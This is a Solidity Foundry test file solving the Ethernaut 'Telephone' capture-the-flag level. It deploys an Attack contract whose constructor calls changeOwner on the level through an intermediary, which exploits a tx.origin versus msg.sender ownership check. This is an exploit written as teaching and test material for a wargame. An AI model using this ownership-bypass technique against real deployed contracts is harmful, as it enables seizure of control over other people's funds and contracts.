// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/04-Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";

contract TelephoneTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testTelephoneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Telephone level = Telephone(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        new Attack(address(level));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    constructor(address target) {
        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        console.log(success);
    }
}